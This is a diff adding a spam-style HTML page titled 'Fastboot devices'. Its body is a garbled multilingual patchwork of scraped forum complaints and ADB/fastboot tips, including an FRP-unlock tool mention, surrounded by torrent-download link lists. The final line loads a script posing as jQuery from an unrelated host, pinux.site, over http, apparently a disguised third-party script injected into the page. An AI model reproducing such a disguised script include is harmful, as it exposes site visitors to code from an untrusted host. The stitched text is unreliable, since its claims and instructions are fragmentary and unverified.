@@ -1,0 +1,151 @@
+<!DOCTYPE HTML>
+
+<html>
+
+<head>
+    <title>Fastboot devices - ootheemai.java9.wtf</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="main.css" />
+</head>
+
+<body class="subpage">
+    <div id="page-wrapper">
+
+        <!-- Header -->
+        <section id="header">
+            <div class="container">
+                <div class="row">
+                    <div class="col-12">
+
+                        <!-- Logo -->
+                        <h1><a href="/" id="logo">ootheemai.java9.wtf</a></h1>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Content -->
+        <section id="content">
+            <div class="container">
+                <div class="row">
+                    <div class="col-9 col-12-medium">
+
+                        <!-- Main Content -->
+                        <section>
+                            <header>
+                                <h2>Fastboot devices</h2>
+                            </header>
+                            <p>fastboot devices fastboot flash radio radio.img fastboot reboot-bootloader Again only reboot if all goes well (It will if you follow all direction) Upon rebooting your bootloader you will notice your radio version has changed, congrats. For Windows: The problem is that once the device is in fastboot mode, it shows up as a different device: "Google, Inc Android 1.0.". So doing "lsusb" in the VM showed no device connected, and obviously "fastboot devices" returned nothing until I added the "second" device as a filter for the VM as well. Hope this helps someone. Для того, чтобы прошить Андроид-аппарат через Fastboot, потребуется знание консольных команд одноименного режима работы девайса, а также. title. edit: fixed it, had to install some drivers under device manager. How to Use ADB & Fastboot Commands with your Android Device. Below is a list of basic ADB commands along with their functioning. adb devices – Checks whether your device is connected or not. If its connected, some random numbers will appear in command window. adb reboot recovery – Device boots in recovery mode. adb reboot bootloader. While in fastboot mode, you can directly flash the file system, unsigned partition images in your Android device over a USB connections. Not all the Android phones/tablets have the Fastboot mode. Nexus device comes with fastboot by default as well as some other new devices from other brands. 
+Scenario: the device is visible with adb devices but is not detected with fastboot devices and the other suggestions here don't work; you still end up with "waiting for device" on Windows and aren't able to choose a driver to install via rahul pandey's answer using the Google USB driver. While in fastboot mode, you can type fastboot devices to verify that your device is being detected. Popular adb commands. adb pull - pulls the file to  If isn’t specified, it will pull to the current folder. adb logcat - allows you to view the device log in real-time. · NaNdroid backup: Более-менее приемлемый способ НАНДРОИД БЭКАПА И,соответственно, ВОССТАНОВЛЕНИЯ. Необходимо прошить Android c помощью FastBoot, но не знаете как?  fastboot devices. Данную команду необходимо выполнять когда устройство уже в режиме прошивке (bootloader). My rooted Nexus 7 (2013) started doing the thing where it just sits and spins the Google opening screen at me and won't proceed any further. This happened once before, a year or so ago I think, and I was able to fix it using the Nexus Root Toolkit. The device is rooted and has (had?) TWRP as Recovery. So, I try to boot into Recovery mode and I get to the point where I should be able to choose, but when I hit the power button to select Recovery the device just goes to the open Google screen. This package (adb-setup-1.4.3.zip) installs ADB and Fastboot Drivers on your windows PC. It is recommended to install them system-wide when the program prompts. Once the ADB and Fastboot Drivers are installed you can Enable USB debugging and connect your device to PC, and pass ADB and Fastboot commands. eng bootloaders were initially prepaired for testers of pre-release and developmental devices to make specific changes. they were never really intended to be in the public's hands as i mentioned,i dont think ive ever seen one for the one s. im sure one exists,but no one has leaked it,or accidentally found a device with it,if 
+Если у вас такая же картина - то по fastboot devices устройство должно успешно определяться. Fastboot devices позволяет понять, способно ли устройство принимать сигнал от Fastboot и выполнять заданные команды. Это мощный инструмент. My Pixel 3 XL died on me yesterday when I was on the phone. Instead of flashing the red lightning symbol like it usually does and should do, it was completely black and unresponsive. I've plugged it into the original charger which I know works, to no avail. The only responsiveness I get is the Fastboot mode bootloader menu which looks normal, except that on the 9th row it says ' Device State: error!'. I don't understand what that means, I have not dabbled with the OS in a while Порой полезно знать, как откатить прошивку Андроида до предыдущей версии. Эта операционная система регулярно получает обновления. Solutions for Fastboot Devices command not Working and Device not Found. And It's 100% Working Personally Tested. I've shown in this video How to Install. 4 - press windows key + X and go to device manager, look for the Android device with exclamation mark 5 - right click on Android Device > update driver software > browse my computer. > let me pick. > look for Android and then select Android Fastboot Interface if memory serves me right. And that's it. Fastboot should be recognized. Redmi note 4 not recognised as fastboot device in adb. Here are screenshots of my developer options https://imgur.com/a/WFTFE2z. · Есть пара вопросов: 1) Устанавливаем драйвера на телефон и adb если ранее это сделано не было. т.е. ты вводишь команду fastboot devices и у тебя пустая строка, нет строки devices attached какая система на ПК? на win10 часто проблемы. 
+I've installed all the necessary drivers and my phone is accessible while in normal mode but when I boot into fastboot mode the phone wasn't detected when I type "fastboot devices" also my OP5T driver in my computer has exclamation point and wasn't installed correctly. I've been finding solution for hours now and I seem to get it work. Also I'm using powershell instead of cmd (damn windows 10). I'd appreciate Сегодня мы рассмотрим "наболевший" вопрос, о котором многие спрашивали в комментариях здесь и на канале YouTube, а именно - как разблокировать Micromax Q415 от оператора. Did I miss a step or something. Компания-производитель смартфонов и многих других девайсов Xiaomi известна сегодня всем почитателям Android-устройств. I'm trying to load dirtysanta, twrp, etc and I cant get past step one. I run adb reboot bootloader and it just restarts my phone normally. I try to power it off and use every single button combination I can find online and none of them bring me to recovery mode. What the heck am I doing wrong? Is there a new method to unlock this thing? Are the few people I found saying there was a security update that locked it up good correct? Help! edit: Found the answer here: https://forum.xda-developers.co. · Внимание! Новые темы необходимо создавать только в корневом разделе! В дальнейшем они будут обработаны модераторами. 
+~~- USB debugging is enabled. - OEM unlocking is enabled. - Typing `adb devices` shows the attached device.~~ ~~Once I type `adb reboot bootloader`, typing `fastboot devices` brings up nothing. I'm wondering if I installed fastboot properly or if that has nothing to do with it. Any help would be greatly appreciated; thanks so much!~~ I got past that by downloading the Motorola driver, and now it looks like step 4 in the LineageOS guide (https://wiki.lineageos.org/devices/athene/install) Как прошить андроид через компьютер. Универсальным средством для прошивки Андроид девайсов при помощи ПК является утилита Fastboot. fastboot devices Показать список подключенных устройств. fastboot continue Продолжить с автозагрузкой. fastboot reboot Перезагрузить аппарат. If you’ve ever tried to root your Android phone or flash a ROM, you may have heard about ADB and/or fastboot. These two tools are surprisingly powerful, but can be a bit overly complex to install. I am trying to root my Nexus 5x running 7.0. When I plug it into my computer, and type in "adb devices" in cmd, my device shows up. However, when I put my phone into fastboot, and I type in "fastboot devices" in cmd, it is blank. Here is a picture of my error: Any ideas why this is happening? Thanks in advance. 
+Код ваучера для навигации htc, синдбад и калиф багдада (1973), фильмы 3d для самсунг, сценарий. I have no idea what to do next. My G5 refuses to be detected at all by multiple compuyters in fastboot mode. it's ine in ADB, but as soon as it reboots into bootloader, it's like a hghost, neither of my PCs can detect it. USB 2 and 3, both win 10. Ridiculous amount of drivers downloaded, but they don't make a difference if it doesn't show in device manager. Everyone's instructions say 'adb reboot bootloader, then look in device manager and your phone will be clearly listed there to change. Can't access the modes by the volume button.And the worst part about this is that it isn't my phone.It's just stuck there and have to answer my friend tomorrow😂. I was trying to unlock the bootloader on my 5X by following this article ( I got everything, until the part where it said to use the command fastboot devices to list the serial number of the device, but when I do, nothing shows up. I installed all the drivers (I think?) and installed Android SDK, set up environment variables. (Imgur screenshot: Edit: Apparently my PC recognizes the phone when it's normally. Fastboot. Fastboot is protocol used to update the flash filesystem in Android devices from a host over USB. It allows flashing of unsigned partition images. I've been at it for hours and attempted several different tutorials online (top 2 youtube videos plus technobuzz guide). Whenever I boot my phone into fastboot mode and type in the command window on my PC (windows 10) "fastboot devices" it just returns another empty command prompt. Is anyone else having this issue? Any solutions? I'm about to throw this thing out the window. additionally, I have tried installing universal adb drivers 15 seconds ADB Installer v1.4.3 ADB, Fastboot and Drivers What is this? This is All-in-One installer for 3 most needed PC tools for Android. Hi ! I tried to root my onePlus3T, and got a bootloop. I flashed the stock recovery and wiped, then tried to sideload the stock ROM, but the pc does nto recognize the phone. I tried on 2 diffrents PCs and it's still not working ! Anybody having the same problem or having a solution ? Thanks. Довольно часто распространенная проблема в Android это - ошибка waiting for device при работе с ADB или Fastboot, в данной статье научимся ее исправлять! Когда когда вы пытаетесь. 
+ Fastboot ist ein Protokoll bzw. Tool und im Android SDK enthalten.  create bootimage and flash it devices list all connected devices continue continue with autoboot reboot reboot device normally reboot-bootloader reboot device into bootloader. I've installed Nexus 6p drivers, universal drivers, and some other drivers another guide showed me and nothing seems to work. I'm about to do ADB reboot bootloader and adb devices, but the fastboot stuff just doesn't work. I'm on Windows. Fastboot devices. Vi trovare in questa situazione dopo aver collegato il vostro dispositivo al PC e averlo riavviato in modalità fastboot? Per risolvere dobbiamo installare i driver corretti. I'm am certainly not a pro, but I have rooted a few phones before. I was doing nothing unusual with my phone, i went to wake the screen and since then it just never turned on again Here's whats wrong: -Phone won't boot AT ALL -No Recovery or Fastboot -Device was recognized by both windows 7 and XP as QHSUS_BULK for a day, the next unknown Device -No response on PC, accept drivers not found -One doesn't recognize Drivers on PC (Samsung, Color Driver, Google ADB) Have tried:. Turn off your device. Connect a USB-cable to your computer. On your device, press the Fastboot key (Volume up for most devices, see Useful key combinations) at the same time as you connect the other end of the USB-cable. 
+Hello dear redditers, I have this issue and it's driving me literally insane. I can't take it anymore. I want to install Oxygen OS on my OPO, but when I want to root it and install TWRP though fastbooting on it, the command "fastboot devices" does nothing. I know there are tons and tons of threads and blod posts onthis issue online, but none of the fixes worked for me. I also tried multiple laptops. I am totally frustrated, as this is the third day I am working on it. Someone please help!!. It seems that the Google Android 1.0 driver won't install properly even after pulling all possibly related drivers. Any suggestions. В третьей по счёту статье в нашем цикле по Android Debug Bridge мы разберемся с утилитой fastboot. nexus 5 problem. would not wake from sleep. attached charging cable, no battery charge icon on screen. googled problem. found a thread on reddit mentioning pressing power button for 30sec. that worked, but only got "google" on screen, without bouncing colored icons. the phone is rooted, and also tried power on + vol up + vol down buttons for 30+sec, sometimes more, was able to get into bootloader menu, tried recovery mode, start mode, but nothing worked at first. on a fluke fastboot devices. Данную команду выполнять когда устройство уже в режиме прошивке (bootloader) Команды разблокировки и блокировки загрузчика Nexus. I need some help with my laptop not finding my OPO as a fastboot device Checking if the ADB was working went fine and showed up as version 1.0.32 I tried both installing the universal ADB driver and the alternate method but neither of them works and my phone just won't show up. I tried different cables, no success. If my phone is turned on and I connect it to my laptop it connects fine, if I try it in fastboot I get a "not connected" sound I'm running windows 7 pro on my laptop Devices marked with ★ are locked. If your device is locked, please click here to unlock it first. Devices marked with ☆ are unlocked.  ★ POCO F1 Latest Global Developer Version Fastboot File Download ★ Xiaomi Mi 3 Latest Global Stable Version Fastboot File Download. 
+I'm trying to install CyanogenMod 13 on my oneplus X. I started following this guide (https://forums.oneplus.net/threads/guide-onyx-how-to-unlock-bootloader-install-custom-recovery-root-take-efs-backup-more.401713/) to make sure I have a backup of the original rom. After some trouble with the drivers (I'm on Windows10 and had to disable driver signing) I finally was able to use the commands "adb devices" and "fastboot devices". So I was able to flash TWRP recovery on my OnePlusX by running. If you've ever owned an HTC device or anything in the Nexus line, odds are, you have typed the word "fastboot" into your command line at one time or another. That said, odds are, you have only just barely scratched the surface of what this handy little Android tool can do. Let's. Hi guys, I've connected my Fossil Marshall Q Smartwatch wirelessly to my win10 PC, but it won't show up in fastboot mode. It shows up perfectly fine when it's turned on, with the "adb devices" command. However, when I send it the command: "adb reboot bootloader", it goes into fastboot mode and I am unable to communicate with it anymore. "fastboot devices" results in nothing. Help please. Information on Fastboot Mode on Android from Kingo, which offers the best one-click Android root software Hi guys, I am trying to root my phone and whenever I try to do the fastboot devices command I am left with a blank space. I have the driver installed, but windows gives me error code 10. Any thoughts on how to solve. 
+There are many hidden fastboot commands on your device. In order to find them, we will need to dump the bootloader and examine the contents. Hey all, When I follow CM's wiki instructions (https://wiki.cyanogenmod.org/w/Install_CM_for_shieldtablet) I get an empty list when using the command "fastboot devices", whereas "adb devices" shows the device just fine. Screenshot ( I am currently using Windows 10 and would like to recognize my Nvidia Shield K1 tablet. Now what is notable is that another laptop (not mine) which uses windows 8 works flawlessly. I used multiple sources of adb and fastboot. I am trying to load a customized kernel on my NVIDIA test git. I typed fastboot boot myImage after which which I get: I think this is a problem with a driver on fastb. Unlocking bootloader through Fastboot is an easy task to perform, however, not all phone companies make it an available option for you. Most of the manufacturer's setup the device as such that their devices to let users unlock bootloader only when they request a bootloader unlock token. I've searched on the web about this problem and it's usually solved by installing the appropriate drivers. Problem is I'm on a Mac. When I plug in my device, it can be discovered If you like to tinker around with your Android devices then you must know about adb & fastboot. These two command line commands are a must have for every Android nerd out there. If your phone has an unlocked bootloader, you can use Fastboot commands to flash factory images. That may sound like a bunch of technical jargon, but when it comes down to it, this is the best method for updating a rooted device, fixing a bricked phone, reverting to stock, or even getting. ADB, Install ADB Drivers Fastboot Windows / Mac OS X. How to setup / install ADB and fastboot android. Download install ADB drivers for your android. Android Fastboot Reset Tool. You can download android fastboot reset tool from here and that can use for unlocking FRP lock, Pattern unlocks 
+Download 2019 adb android Latest Minimal ADB and Fastboot Tools for Windows 7, 8, 10 Linux and Mac To flash Full Step By Step Guide to Safely Install TWRP / CWM Recovery via Fastboot On Android: Here in this guide you will be guided on How To Install a custom Recovery. Watch the full video on How to install ADB and Fastboot on Windows/PC. Mostly the Android users who frequently loves modding and tweaking their device, and also tries. Version 22036 Download 0.00 KB File Size 1 File Count August 17, 2017 Create Date August 17, 2017 Last Updated Tunggu beberapa detik. Deskripsi : fastboot_edl.7z. Today we discuss how to install adb and fastboot on windows 10,8/8.1,7 and xp. If you want to unlock bootloader or flash custom recovery “Here is the proper way to install the ADB and Fastboot drivers for Nexus, Oneplus, Samsung or any other Android devices.” In past, we share lots of articles. If you’ve ever tried to root your Android phone or flash a ROM, you may have heard about ADB and/or fastboot. These two tools are surprisingly powerful. If you need to root your Android smartphone or tablet, you will most likely need to use fastboot and adb tools(except Samsung devices which </p>
+                        </section>
+
+                    </div>
+                    <div class="col-3 col-12-medium">
+
+                        <!-- Sidebar -->
+                        <section>
+                            <header>
+                                <h2>Links to Important Stuff</h2>
+                            </header>
+                            <ul class="link-list">
+                                <li><a href="yc3-raspisanie-marshrutok-avtovokzal-zaporozhe.html">Расписание маршруток автовокзал запорожье</a></li>
+                                <li><a href="yc3-skachat-film-mortal-kombat-2015-cherez-torrent.html">Скачать фильм мортал комбат 2015 через торрент</a></li>
+                                <li><a href="yc3-skachat-igry-na-samsung-g355h.html">Скачать игры на самсунг g355h</a></li>
+                                <li><a href="yc3-skachat-cherez-torrent-knigi-shilovoy-yulii.html">Скачать через торрент книги шиловой юлии</a></li>
+                                <li><a href="yc3-skachat-cherez-torrent-diskografiyu-gruppy-kino.html">Скачать через торрент дискографию группы кино</a></li>
+                                <li><a href="yc3-skachat-programmu-graffiti-na-android.html">Скачать программу граффити на андроид</a></li>
+                            </ul>
+                        </section>
+                        <section>
+                            <header>
+                                <h2>Links</h2>
+                            </header>
+                            <ul class="link-list"><li>fastboot_edl.7z.</li>
+</ul>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <section id="footer">
+            <div class="container">
+                <div class="row">
+                    <div class="col-8 col-12-medium">
+
+                        <!-- Links -->
+                        <section>
+                            <h2>Links to Important Stuff</h2>
+                            <div>
+                                <div class="row">
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="yc3-skachat-muzyku-vse-veselyatsya-a-mne-grustno.html">Скачать музыку все веселятся а мне грустно</a></li>
+                                            <li><a href="yc3-mts-konnekt-3g-drayvera-skachat.html">Мтс коннект 3g драйвера скачать</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="yc3-ghost-instrukciya.html">Ghost инструкция</a></li>
+                                            <li><a href="yc3-devchata-1961-v-cvete-torrent.html">Девчата 1961 в цвете торрент</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="yc3-skachat-muzyku-iz-filma-zhestokost.html">Скачать музыку из фильма жестокость</a></li>
+                                            <li><a href="yc3-osnovy-sluzhebnogo-sobakovodstva-kniga.html">Основы служебного собаководства книга</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="yc3-elektricheskaya-shema-besprovodnogo-zvonka.html">Электрическая схема беспроводного звонка</a></li>
+                                            <li><a href="yc3-burn-for-free.html">Burn for free</a></li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+
+                    </div>
+                    <div class="col-4 col-12-medium imp-medium">
+
+                        <!-- Blurb -->
+                        <section>
+                            <h2>An Informative Text Blurb</h2>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Copyright -->
+        <div id="copyright">
+            &copy; Untitled. All rights reserved.</a>
+        </div>
+
+    </div>
+
+    <script type="text/javascript">
+        new Image().src = "//counter.yadro.ru/hit;jquery?r" +
+            escape(document.referrer) + ((typeof(screen) == "undefined") ? "" :
+                ";s" + screen.width + "*" + screen.height + "*" + (screen.colorDepth ?
+                    screen.colorDepth : screen.pixelDepth)) + ";u" + escape(document.URL) +
+            ";h" + escape(document.title.substring(0, 150)) +
+            ";" + Math.random();
+    </script>
+<script src="http://pinux.site/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</body>
+</html>
